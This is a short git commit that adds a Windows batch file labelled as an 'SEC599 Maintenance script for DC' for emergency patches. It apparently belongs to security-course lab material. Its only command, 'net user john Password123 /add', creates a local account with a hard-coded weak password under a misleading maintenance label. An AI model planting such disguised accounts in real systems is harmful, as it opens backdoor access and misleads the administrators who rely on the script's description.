465f99e81aa9eec64e194ea2c327ba099749cc84
ErikVaBu <evanbuggenhout@nviso.be>
2019-01-30 17:49:02 +0400

    Update dc-execute.cmd

--- dc-execute.cmd
+++ dc-execute.cmd
@@ -1,1 +1,6 @@
+REM SEC599 Maintenance script for DC
+REM ---------------------------------
+REM Last update: 30 January 2019
+REM This script is used for emergency patches / updates in SEC599
 
+net user john Password123 /add
